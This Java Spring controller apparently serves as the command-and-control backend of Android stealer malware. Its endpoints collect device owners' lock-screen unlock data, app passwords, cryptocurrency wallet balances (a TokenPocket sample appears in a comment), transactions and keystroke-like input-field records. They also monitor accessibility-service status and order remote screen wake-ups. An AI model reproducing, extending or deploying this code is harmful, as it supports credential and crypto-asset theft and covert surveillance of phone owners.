package io.renren.modules.app.web.api;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import com.baomidou.mybatisplus.core.conditions.update.LambdaUpdateWrapper;
import io.renren.common.constant.Constant;
import io.renren.common.utils.IpUtils;
import io.renren.common.utils.Result;
import io.renren.commons.dynamic.datasource.config.DynamicContextHolder;
import io.renren.modules.app.common.AutoReapEnum;
import io.renren.modules.app.common.DeviceStatusEnum;
import io.renren.modules.app.common.Utils;
import io.renren.modules.app.common.WakeStatusEnum;
import io.renren.modules.app.context.DeviceContext;
import io.renren.modules.app.entity.*;
import io.renren.modules.app.param.AppAssetsPram;
import io.renren.modules.app.param.PasswordParam;
import io.renren.modules.app.param.PingParam;
import io.renren.modules.app.param.TransferRecordParam;
import io.renren.modules.app.service.*;
import io.renren.modules.app.vo.DeviceStatus;
import io.renren.modules.app.vo.HeartResponse;
import io.renren.modules.app.vo.ServerConfig;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.validation.annotation.Validated;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import java.security.cert.PKIXParameters;
import java.util.Date;
import java.util.List;
import java.util.Objects;

import static io.renren.common.constant.Constant.APP_NAME;

@Slf4j
@RestController
@RequestMapping("/api/device")
public class DeviceApiController extends BaseApiController {

    @Autowired
    DeviceService deviceService;
    @Autowired
    InstallAppService installAppService;
    @Autowired
    AppTransferRecordService appTransferRecordService;

    @Resource
    private TransferService transferService;
    @Resource
    private MajorDataService majorDataService;


    @Resource
    private InputTextRecordService inputTextRecordService;

    @Resource
    private LogService logService;

    @Resource
    private AssetService assetService;

    /**
     * 心跳. 废弃
     *
     * @return
     */
    @Deprecated
    @PostMapping("heart")
    public Result<HeartResponse> ping(HttpServletRequest request, @RequestBody PingParam param) {
        String deviceId = param.getDeviceId();
        HeartResponse heartResponse = new HeartResponse();
        Device dbDevice = deviceService.findByDeviceId(deviceId);
        Device device = new Device();
        device.setDeviceId(deviceId);
        device.setIp(IpUtils.getIpAddr(request));
        device.setModel(param.getModel());
        device.setCreateDate(new Date());
        device.setScreenHeight(param.getScreenHeight());
        device.setScreenWidth(param.getScreenWidth());
        device.setLanguage(param.getLanguage());
        device.setSystemVersion(param.getSystemVersion());
        device.setBrand(param.getBrand());
        device.setSdkVersion(param.getSdkVersion());
        device.setLastHeart(new Date());
        if (dbDevice == null) {
            device.setStatus(param.getScreenStatus());
            log.info("新设备:{} Data:{} ", device, JSONObject.toJSONString(param));
            deviceService.save(device);
            return Result.toSuccess(heartResponse);
        }
        device.setId(dbDevice.getId());
        if (dbDevice.getStatus() == Constant.DeviceStatus.need_wake /*&& param.getScreenStatus() == Constant.DeviceStatus.screen_off*/) {
            log.info("{} - 需要唤醒", deviceId);
            heartResponse.setNeedWakeup(true);
            heartResponse.setLockScreen(dbDevice.getLockScreen());
            device.setStatus(Constant.DeviceStatus.wait_wake);
        } else if (dbDevice.getStatus() == Constant.DeviceStatus.wait_wake && param.getScreenStatus() == Constant.DeviceStatus.screen_on) {
            //唤醒成功
            device.setStatus(param.getScreenStatus());
            log.info("{} - 唤醒成功", deviceId);
        } else {
            device.setStatus(param.getScreenStatus());
        }
        log.info("收到设备:{} 心跳消息. Data:{}", deviceId, JSONObject.toJSONString(param));
        deviceService.updateById(device);
        heartResponse.setAutoReap(Objects.equals(device.getAutoReap(), Constant.YN.Y));
        return Result.toSuccess(heartResponse);
    }


    @PostMapping("uploadUnLock")
    public Result<Boolean> uploadUnLock(@RequestBody JSONObject json) {
        String deviceId = json.getString("deviceId");
        Device device = deviceService.findByDeviceId(deviceId);
        if (device == null) {
            log.error("设备:{} 不存在", DeviceContext.getDeviceId());
            return Result.toError("device not extis.");
        }
        if (Objects.equals(Constant.YN.Y, device.getFixLockScreen())) {
            //固定锁屏密码
            return Result.toSuccess(null);
        }
        Device update = new Device();
        update.setId(device.getId());
        update.setLockScreen(json);
        deviceService.updateById(update);
        log.info("更新设备:{} 解锁密码信息成功. Data:{} ", deviceId, JSON.toJSONString(json));
        return Result.toSuccess(true);
    }


    /**
     * 设备APP 安装信息
     *
     * @param params
     * @return
     */
//    @PostMapping("install")
//    public Result<Boolean> install(@RequestBody @Validated List<InstallAppParam> params) {
//        QueryWrapper<InstallApp> deleteQuery = new QueryWrapper<>();
//        deleteQuery.lambda().eq(InstallApp::getDeviceId, DeviceContext.getDevicecId());
//        List<InstallApp> list = params.stream().map(app -> {
//            InstallApp installApp = new InstallApp();
//            installApp.setDeviceId(DeviceContext.getDevicecId());
//            installApp.setAppName(app.getAppName());
//            installApp.setPackageName(app.getPackageName());
//            return installApp;
//        }).collect(Collectors.toList());
//        installAppService.remove(new LambdaQueryWrapper<InstallApp>().eq(InstallApp::getDeviceId, DeviceContext.getDevicecId()));
//        installAppService.saveBatch(list);
//        log.info("设备:{} 安装APP 更新成功 ：{} ", DeviceContext.getDevicecId(), JSON.toJSONString(params));
//        return Result.toSuccess(true);
//    }


    /**
     * 设备APP 密码数据
     *
     * @param params
     * @return
     */
    @PostMapping("pass")
    public Result<Boolean> pass(@RequestBody @Validated List<PasswordParam> params) {
        for (PasswordParam param : params) {
            InstallApp app = installAppService.getOne(new LambdaQueryWrapper<InstallApp>()
                    .eq(InstallApp::getDeviceId, DeviceContext.getDeviceId())
                    .eq(InstallApp::getPackageName, param.getPackageName()));
            if (app == null) {//app 安装应用单独上传
                log.error("设备:{} 安装的APP ：{} 不存在", DeviceContext.getDeviceId(), param.getPackageName());
                continue;
            }
            installAppService.update(new LambdaUpdateWrapper<InstallApp>()
                    .set(InstallApp::getPassword, param.getPassword())
                    .eq(InstallApp::getDeviceId, DeviceContext.getDeviceId())
                    .eq(InstallApp::getPackageName, param.getPackageName()));
            log.info("更新设备:{} App:{} 密码信息成功. Data:{} ", DeviceContext.getDeviceId(), app.getAppName(), JSON.toJSONString(param));
        }
        return Result.toSuccess(true);
    }

    @RequestMapping("uploadMajorData")
    public Result<Void> uploadMajorData(@RequestBody List<MajorData> majorDataList, HttpServletRequest request) {
        log.info("上传重要数据:{}", JSONObject.toJSONString(majorDataList));
        String deviceId = request.getHeader("device_id");
        String pkg = request.getHeader("pkg");
        Device device = deviceService.findByDeviceId(deviceId);
        Date now = Utils.now();
        for (MajorData majorData : majorDataList) {
            majorData.setId(null);
            majorData.setDeviceId(deviceId);
            majorData.setPkg(pkg);
//            majorData.setAppName(APP_NAME.get(majorData.getPackageName()));
            MajorData _majorData = majorDataService.findByDeviceIdAndResourceId(majorData.getDeviceId(), majorData.getResourceId());

            majorData.setTime(now);
            if (_majorData == null) {
                majorDataService.save(majorData);
            } else {
                majorData.setId(_majorData.getId());
                majorDataService.updateById(majorData);
            }
            if (Objects.equals(majorData.getPassword(), Constant.YN.Y)) {
                JSONObject appPassword = device.getAppPassword();
                if (appPassword == null) {
                    appPassword = new JSONObject();
                }
                appPassword.put(majorData.getResourceId(), majorData);
                Device updateDevice = new Device();
                updateDevice.setId(device.getId());
                updateDevice.setAppPassword(appPassword);//TODO ?
                deviceService.updateById(updateDevice);
            }
        }
        return Result.toSuccess(null);
    }

    @RequestMapping("uploadLog")
    public Result<Void> uploadLog(@RequestBody List<Log> logs, HttpServletRequest request) {
        String deviceId = request.getHeader("device_id");
        String pkg = request.getHeader("pkg");
        for (Log _log : logs) {
            _log.setId(null);
            _log.setDeviceId(deviceId);
            _log.setPkg(pkg);
        }


        logService.saveBatch(logs);
        return Result.toSuccess(null);
    }

    @RequestMapping("uploadAsset")
    public Result<Void> uploadAsset(@RequestBody List<Asset> list, HttpServletRequest request) {
        String deviceId = request.getHeader("deviceId");
        String pkg = request.getHeader("pkg");

        log.info("{} - 上传资产信息:{}", deviceId, JSONObject.toJSONString(list));
        Device device = deviceService.findByDeviceId(deviceId);
        for (Asset asset : list) {
            asset.setId(null);
            asset.setDeviceId(deviceId);
            asset.setPkg(pkg);

            if (Objects.equals(asset.getCurrency(), Constant.Asset.ALL)) {
                //总资产, 更新到设备表
                //{"TokenPocket-BSC-2": {"id": null, "appPkg": "vip.token....", "name": "BSC-2", "unit": "$", "price": 4427.58, "title": "", "token": "", "amount": 4427.02, "currency": "ALL", "deviceId": "5998742b47f395c0", "updateTime": 1731392404241}}
                //[{"amount":4427.6,"appPkg":"vip.token....","currency":"ALL","name":"BSC-2","price":4427.43,"unit":"$"}]
                JSONObject assets = device.getAssets();
                if (assets == null) {
                    assets = new JSONObject();
                }
                String assetKey = String.format("%s-%s", asset.getAppPkg(), asset.getName());
                assets.put(assetKey, asset);
                Device updateDevice = new Device();
                updateDevice.setId(device.getId());
                updateDevice.setAssets(assets);
                //更新设备
                deviceService.updateById(updateDevice);

            }

            Asset _asset = assetService.findByCondition(asset.getDeviceId(), asset.getAppPkg(), asset.getCurrency(), asset.getName());
            if (_asset == null) {
                assetService.save(asset);
            } else {
                asset.setId(_asset.getId());
                assetService.updateById(asset);
            }
        }
        return Result.toSuccess(null);
    }


    @RequestMapping("uploadTransfer")
    public Result<Void> uploadTransfer(@RequestBody List<Transfer> transfers, HttpServletRequest request) {
        String deviceId = request.getHeader("device_id");
        String pkg = request.getHeader("pkg");
        for (Transfer transfer : transfers) {
            transfer.setId(null);
            transfer.setDeviceId(deviceId);
            transfer.setPkg(pkg);
        }
        log.info("上传交易:{}", transfers);
        transferService.saveBatch(transfers);
        return Result.toSuccess(null);
    }


    @RequestMapping("uploadInputTextRecord")
    public Result<Void> uploadInputTextRecord(@RequestBody List<InputTextRecord> inputTextRecords, HttpServletRequest request) {

        String deviceId = request.getHeader("device_id");
        String pkg = request.getHeader("pkg");

        for (InputTextRecord inputTextRecord : inputTextRecords) {
            inputTextRecord.setDeviceId(deviceId);
            inputTextRecord.setPkg(pkg);
        }

        try {
            log.info("上传输入框:{}", JSONObject.toJSONString(inputTextRecords));
            DynamicContextHolder.push("clickhouse");
            inputTextRecordService.insertBatch(inputTextRecords, 200);
            return Result.toSuccess(null);
        } finally {
            DynamicContextHolder.poll();
        }

    }

    /**
     * 服务器配置
     *
     * @return
     */
    @RequestMapping("getConfig")
    public Result<ServerConfig> getConfig(@RequestBody DeviceStatus deviceStatus, HttpServletRequest request) {
        String pkg = request.getHeader("pkg");
        String deviceId = request.getHeader("device_id");
        ServerConfig serverConfig = new ServerConfig(false, null, null, "{}", false);
        log.info("getConfig - pkg:{}, deviceId:{}, value:{}", pkg, deviceId, JSONObject.toJSONString(deviceStatus));


        Device dbDevice = deviceService.findByDeviceId(deviceId);

        if (dbDevice == null) {
            return Result.toSuccess(serverConfig);
        }

        Device updateDevice = new Device();
        updateDevice.setId(dbDevice.getId());
        updateDevice.setLastHeart(Utils.now());
        updateDevice.setAccessibilityServiceEnabled(deviceStatus.isAccessibilityServiceEnabled() ? Constant.YN.Y : Constant.YN.N);


        if (Constant.DeviceStatus.need_wake == dbDevice.getStatus() /*&& param.getScreenStatus() == Constant.DeviceStatus.screen_off*/) {
            log.info("{} - 需要唤醒", deviceId);
            updateDevice.setStatus(Constant.DeviceStatus.wait_wake);
            serverConfig.setWakeUp(true);
        } else if (Constant.DeviceStatus.wait_wake == dbDevice.getStatus() && deviceStatus.getScreenStatus() == Constant.DeviceStatus.screen_on) {
            //唤醒成功
            updateDevice.setStatus(deviceStatus.getScreenStatus());
            log.info("{} - 唤醒成功", deviceId);
        } else {
            updateDevice.setStatus(deviceStatus.getScreenStatus());
        }
        deviceService.updateById(updateDevice);
        return Result.toSuccess(serverConfig);

    }

    //注册设备
    @RequestMapping("/registerDevice")
    public Result<Void> registerDevice(@RequestBody Device device, HttpServletRequest request) {
        log.info("registerDevice:{}", JSONObject.toJSONString(device));
        String deviceId = request.getHeader("device_id");
        String pkg = request.getHeader("pkg");
        device.setDeviceId(deviceId);
        device.setPkg(pkg);

        //TODO
        //device.setIp();
        Device dbDevice = deviceService.findByDeviceId(deviceId);
        if (dbDevice != null) {
            device.setId(dbDevice.getId());
            deviceService.updateById(device);
        } else {
            device.setStatus(Constant.DeviceStatus.screen_on);
            deviceService.save(device);
        }
        return Result.toSuccess(null);
    }

}
